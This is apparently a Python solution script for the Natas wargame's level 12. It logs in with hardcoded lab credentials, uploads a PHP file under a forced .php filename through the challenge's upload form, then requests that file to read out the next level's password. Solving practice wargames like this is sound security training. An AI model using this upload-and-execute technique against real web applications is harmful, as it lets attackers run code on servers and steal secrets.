import re
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas12', 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3')
def get_pass():
    dat = {'filename':'sa439i6682.php'}
    f = {'uploadedfile': open('../passfiles/natas12/getpass.php', 'rb')}
    r = requests.post('http://natas12.natas.labs.overthewire.org/', auth=auth, files=f, data=dat)
    i = r.text.find('The file <a href="upload/')+18
    url = 'http://natas12.natas.labs.overthewire.org/' + r.text[i:i+21]
    r = requests.get(url, auth=auth)
    pass_regex = '[a-zA-Z0-9]{32}'
    print(re.findall(pass_regex,r.text)[0])
if __name__ == "__main__":
    get_pass()
